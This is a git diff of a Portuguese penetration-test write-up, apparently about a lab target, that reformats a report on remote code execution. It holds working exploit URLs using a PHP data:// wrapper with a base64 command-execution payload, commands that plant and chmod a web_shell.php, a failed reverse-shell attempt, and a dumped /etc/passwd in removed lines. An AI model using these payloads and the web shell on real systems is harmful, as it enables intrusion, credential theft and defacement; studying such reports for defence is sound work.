@@ -47,12 +47,12 @@
 Foi identificado o diretório da aplicação que armazena os **uploads de currículos**.  
 Com isso, é possível enviar arquivos maliciosos (.pdf) e executá-los no servidor.  
 
-🔗 Teste inicial:  
+🔗 Teste inicial:  /var/www/html/uploads
 ```
 http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=ls%20-la%20/var/www/html/uploads
 ```
 
-📌 Confirmação: Banco de dados e diretório de uploads identificado.  
+📌 Confirmação: Banco de dados e diretório de uploads identificado.  ( aceita somente arquivos .pdf)
 
 ---
 
@@ -122,12 +122,7 @@ http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCR
 http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=chmod%20777%20/var/www/html/uploads/cmd.pdf
 ```
 
-- Antes:  
-<p align="center">
-  <img width="364" height="117" alt="image" src="https://github.com/user-attachments/assets/8ff534bb-acc2-4de0-ae18-bfdf4858ec9d" />
-</p>
-
-- Depois:  
+- Resultado :  
 <p align="center">
   <img width="430" height="163" alt="image" src="https://github.com/user-attachments/assets/f9528674-fdc2-40a8-a4e3-e33de04431b5" />
 </p>
@@ -150,80 +145,79 @@ Contato: calazanscybersec@gmail.com" > hacked_by_luan.txt
 </p>
 
 ---
+<p align="center">
+  <img width="284" height="135" alt="image" src="https://github.com/user-attachments/assets/7bc73941-7650-47a3-a4b0-c9cc03927e7e" />
+</p>
 
-- Agora vamos descobrir o caminho do /bash comando : which bash
+---
 
-```
-  comando para apagar arquivos criados : rm /var/www/html/nome_arquivo.php ( cuidado )
-  /bin/bash
+## 🖥️ Descobrindo o Caminho do Bash
 
-```
-
-- Criação do arquivo de prompt comando no caminho : /var/www/html
-```
-  http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=echo%20'%3C?php%20echo%20%22%3Cform%20method%3DGET%3E%3Cinput%20type%3Dtext%20name%3Dcmd%20placeholder%3DDigite%20um%20comando%3E%3Cinput%20type%3Dsubmit%20value%3DExecutar%3E%3C/form%3E%3Cpre%3E%22%3B%20if(isset(%24_GET%5B%22cmd%22%5D))%20%7B%20system(%24_GET%5B%22cmd%22%5D)%3B%20%7D%20echo%20%22%3C/pre%3E%22%3B%20%3F%3E'%20%3E%20/var/www/html/web_shell.php
-
-permissão: http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=chmod%20777%20/var/www/html/web_shell.php
-
-caminho : http://rh.businesscorp.com.br/web_shell.php
+- Comando para identificar o caminho do bash:
 
 ```
+which bash
+```
+
+- Comando para apagar arquivos criados (use com cautela):
+
+```
+rm /var/www/html/nome_arquivo.php
+```
+
+- Caminho identificado: `/bin/bash`
+
+---
+
+## 📂 Criação do Arquivo de Prompt de Comando
+
+Arquivo criado no diretório `/var/www/html` com o seguinte comando:
+
+```
+http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=echo%20'%3C?php%20echo%20%22%3Cform%20method%3DGET%3E%3Cinput%20type%3Dtext%20name%3Dcmd%20placeholder%3DDigite%20um%20comando%3E%3Cinput%20type%3Dsubmit%20value%3DExecutar%3E%3C/form%3E%3Cpre%3E%22%3B%20if(isset(%24_GET%5B%22cmd%22%5D))%20%7B%20system(%24_GET%5B%22cmd%22%5D)%3B%20%7D%20echo%20%22%3C/pre%3E%22%3B%20%3F%3E'%20%3E%20/var/www/html/web_shell.php
+```
+
+Aplicando permissões:
+
+```
+http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=chmod%20777%20/var/www/html/web_shell.php
+```
+
+Acesso ao arquivo: [web\_shell.php](http://rh.businesscorp.com.br/web_shell.php)
+
 <p align="center">
   <img width="526" height="442" alt="image" src="https://github.com/user-attachments/assets/14fc622f-5f4d-4596-862b-21f8bb10184a" />
 </p>
 
-- Com tudo montadinho certo ,era só executar a shell mas parece que maquina esta em uma rede diferente e ela nao alcança minhas maquinas para o shell reverso!
+---
+
+## ⚠️ Teste de Conexão
+
+Apesar do arquivo estar pronto, a shell não conseguiu estabelecer a conexão reversa devido à máquina alvo estar em uma rede diferente.
 
 <p align="center">
   <img width="496" height="158" alt="image" src="https://github.com/user-attachments/assets/11aa8f93-6f35-4c36-9f44-0511c6209e8a" />
 </p>
 
-
 <p align="center">
   <img width="471" height="149" alt="image" src="https://github.com/user-attachments/assets/d8e5427b-2d70-41b0-9b5c-b7c1d74dfb66" />
 </p>
 
-- Infelizmente o shell revese não vai rolar , mas é possivel pegar o /etc/passwd e /etc/shadow depois que escalamos o previlegio do arquivo web_shell.sh
+---
 
-- Arquivo etc/passwd:
-```
-    root:x:0:0:root:/root:/bin/bash
-    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-    bin:x:2:2:bin:/bin:/usr/sbin/nologin
-    sys:x:3:3:sys:/dev:/usr/sbin/nologin
-    sync:x:4:65534:sync:/bin:/bin/sync
-    games:x:5:60:games:/usr/games:/usr/sbin/nologin
-    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-    libuuid:x:100:101::/var/lib/libuuid:
-    syslog:x:101:104::/home/syslog:/bin/false
-    mysql:x:102:106:MySQL Server,,,:/nonexistent:/bin/false
-    messagebus:x:103:107::/var/run/dbus:/bin/false
-    landscape:x:104:110::/var/lib/landscape:/bin/false
-    sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
-    business:x:1000:1000:business,,,:/home/business:/bin/bash
+## 🔒 Observações
 
-```
-
+* O shell reverso não funcionou, mas é possível acessar arquivos sensíveis como `/etc/passwd` após a escalada de privilégios no `web_shell.sh`.
+* Recomenda-se apagar o shell `.pdf` e utilizar apenas o `web_shell.sh` para exploração segura de arquivos sensíveis.
 
 ---
 
 ## ⚠️ Conclusão
 
-Foi identificado que o servidor:  
-- Permite **upload e execução de arquivos maliciosos**.  
-- Permite alteração de **permissões de arquivos,criar arquivos , apagar arquivos**.  
-- Apresenta uma falha crítica de **Remote Code Execution (RCE)**.  
+O servidor apresenta vulnerabilidades críticas:
 
-🚨 Esta vulnerabilidade é extremamente grave e possibilita **comprometimento total do sistema**.  
+* Permite **upload e execução de arquivos maliciosos**.
+* Permite alteração de **permissões de arquivos, criação e exclusão de arquivos**.
+* Apresenta uma falha grave de **Remote Code Execution (RCE)**.
 
+🚨 Esta vulnerabilidade é extremamente crítica e possibilita **comprometimento total do sistema**.
